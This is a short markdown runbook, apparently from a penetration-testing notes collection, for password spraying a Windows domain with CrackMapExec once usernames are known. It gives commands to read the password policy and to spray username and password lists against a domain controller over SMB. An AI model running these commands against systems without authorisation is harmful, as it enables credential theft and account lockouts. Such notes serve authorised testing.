---
id: a561570c-b7ad-456f-a170-3deda49b185a
name: Password spray domain (have usernames)
type: procedure
verified: false
submitted: false
created_at: '2023-01-11T20:38:26.144387+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
platforms:
- Windows
tags:
- '[[Enumeration]]'
- '[[Password Spray]]'
commands:
- '[[CrackMapExec get password policy]]'
- '[[CrackmapExec spray multi user/pass]]'
- '[[CrackMapExec test single user/pass]]'
---

# Password spray domain (have usernames)

## Summary

Password spray a domain in attempt to guess passwords from password dictionary list. When you have a username but no password 

## Description

# Description

Password spray a domain in attempt to guess passwords from password dictionary list. When you have a username but no password

## Objective

1. Try to find the password to valid credentials

# Instructions

1. (Optional) Try to get password policy to understand complex requirement of password

**Command** ([[CrackMapExec get password policy]]):

```bash
crackmapexec $IP -u $USERNAME -p $PASSWORD --pass-pol
```

2. Password Spray DC

Spray single user/pass

**Command** ([[CrackMapExec test single user/pass]]):

```bash
crackmapexec smb $DC_IP -u user.text -p password.text --no-bruteforce
```

Spray multi user/pass, can be locked from rate policy

**Command** ([[CrackmapExec spray multi user/pass]]):

```bash
crackmapexec smb $DC_IP -u user.text -p password.text
```

## Platforms

- Windows

## Commands Used

- [[CrackMapExec get password policy]]
- [[CrackmapExec spray multi user/pass]]
- [[CrackMapExec test single user/pass]]

## Tags

- [[Enumeration]]
- [[Password Spray]]
